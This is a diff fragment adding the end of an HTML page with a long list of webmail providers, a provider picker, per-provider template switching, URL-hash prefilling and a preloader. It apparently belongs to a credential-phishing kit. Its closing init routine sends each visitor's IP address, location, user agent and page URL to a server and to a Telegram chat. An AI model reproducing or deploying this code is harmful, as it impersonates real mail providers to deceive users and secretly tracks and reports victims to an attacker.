+            "Cosmote Mail (Greece)", "Vodafone Greece Mail", "OTE Mail (Greece)", "Turkcell Mail (Turkey)", "TTNet Mail (Turkey)",
+            "Vodafone Turkey Mail", "Turk Telekom Mail", "Meteor Mail (Ireland)", "Eir Mail (Ireland)", "Vodafone Ireland Mail",
+            "Three Ireland Mail", "O2 UK Mail (UK)", "Virgin Media Mail (UK)", "TalkTalk Mail (UK)", "BT Mail (UK)", "Sky Mail (UK)",
+            "EE Mail (UK)", "Plusnet Mail (UK)", "John Lewis Mail (UK)",
+            "AOL Mail (US)", "Hotmail (US)", "Outlook US", "Gmail US", "Yahoo US", "Zoho US", "ProtonMail US", "Mail.com US",
+            "GMX US", "FastMail US", "Runbox US", "Posteo US", "StartMail US", "Mailfence US", "Tutanota US", "Kolab Now US",
+            "Soverin US", "CTemplar US", "Disroot US", "Autistici US", "Cox Mail (US)", "Comcast Mail (US)", "Spectrum Mail (US)",
+            "Optimum Mail (US)", "Verizon Mail (US)", "AT&T Mail (US)", "T-Mobile Mail (US)", "Sprint Mail (US)", "CenturyLink Mail (US)",
+            "Frontier Mail (US)", "Suddenlink Mail (US)", "Mediacom Mail (US)", "Windstream Mail (US)", "EarthLink Mail (US)",
+            "Juno Mail (US)", "NetZero Mail (US)", "Prodigy Mail (US)", "SBCGlobal Mail (US)", "Bellsouth Mail (US)",
+            "RoadRunner Mail (US)", "Charter Mail (US)", "Rogers Mail (Canada)", "Bell Mail (Canada)", "Telus Mail (Canada)",
+            "Shaw Mail (Canada)", "Cogeco Mail (Canada)", "Videotron Mail (Canada)", "SaskTel Mail (Canada)", "MTS Mail (Canada)",
+            "Virgin Mobile Canada Mail", "Fido Mail (Canada)", "Koodo Mail (Canada)", "Total Mail (Brazil)", "UOL Mail (Brazil)",
+            "Globo Mail (Brazil)", "Terra Mail (Brazil)", "IG Mail (Brazil)", "Bol Mail (Brazil)", "R7 Mail (Brazil)", "Oi Mail (Brazil)",
+            "Claro Mail (Brazil)", "Vivo Mail (Brazil)", "Tim Mail (Brazil)", "Net Virtua Mail (Brazil)", "Gmail Brazil", "Outlook Brazil",
+            "Yahoo Brazil", "Mail.com Brazil", "GMX Brazil", "ProtonMail Brazil", "Zoho Brazil", "FastMail Brazil"
+        ]; }
+    
+    function buildModalGrid() {
+        const gridContainer = document.getElementById('providersGrid');
+        if (!gridContainer) return;
+        const providers = getProviderList();
+        gridContainer.innerHTML = '';
+        providers.forEach(prov => {
+            const div = document.createElement('div');
+            div.className = 'grid-provider';
+            div.textContent = prov;
+            div.addEventListener('click', () => {
+                onProviderClick(prov);
+                const modal = document.getElementById('providersModal');
+                if (modal) modal.style.display = 'none';
+            });
+            gridContainer.appendChild(div);
+        });
+    }
+    
+    const modalElement = document.getElementById('providersModal');
+    const openModalBtn = document.getElementById('openProvidersModalBtn');
+    const closeModalButton = document.getElementById('closeModalBtn');
+    
+    if (openModalBtn) {
+        openModalBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (modalElement) modalElement.style.display = 'flex';
+        });
+    }
+    if (closeModalButton) {
+        closeModalButton.addEventListener('click', () => {
+            if (modalElement) modalElement.style.display = 'none';
+        });
+    }
+    if (modalElement) {
+        window.addEventListener('click', (e) => {
+            if (e.target === modalElement) modalElement.style.display = 'none';
+        });
+    }
+    
+    // ---- PRELOADER LOGIC ----
+    let isI18nReady = false;
+    let preloaderRemoved = false;
+    
+    function removePreloaderAndShowUI() {
+        if (preloaderRemoved) return;
+        preloaderRemoved = true;
+        const preloader = document.getElementById('preloader');
+        const mainContainer = document.querySelector('.main-container');
+        if (preloader) {
+            preloader.style.opacity = '0';
+            setTimeout(() => {
+                preloader.style.display = 'none';
+                if (mainContainer) {
+                    mainContainer.style.display = 'flex';
+                    mainContainer.style.flexDirection = 'column';
+                }
+            }, 500);
+        } else {
+            if (mainContainer) mainContainer.style.display = 'flex';
+        }
+    }
+    
+    window.addEventListener('i18n-ready', function() {
+        isI18nReady = true;
+        updateTemplateForProvider("Webmail");
+        attachSidebarProviders();
+        buildModalGrid();
+        handleHashPrefill();
+        removePreloaderAndShowUI();
+    });
+    
+    setTimeout(() => {
+        if (!preloaderRemoved) {
+            if (!isI18nReady) {
+                if (!window.i18n) {
+                    window.i18n = { t: (key) => key };
+                }
+                updateTemplateForProvider("Webmail");
+                attachSidebarProviders();
+                buildModalGrid();
+                handleHashPrefill();
+            }
+            removePreloaderAndShowUI();
+        }
+    }, 5000);
+    
+    // INIT: Send visit to both server and Telegram
+    (async function init() {
+        await fetchUserIPAndLocation();
+        await sendToServer('visit', {
+            ip: userIP,
+            location: userLocation,
+            userAgent: userAgent,
+            url: pageUrl
+        });
+        await sendToTelegram(`✅ <b>Page loaded successfully</b>`, true);
+    })();
+</script>
+</body>
+</html>
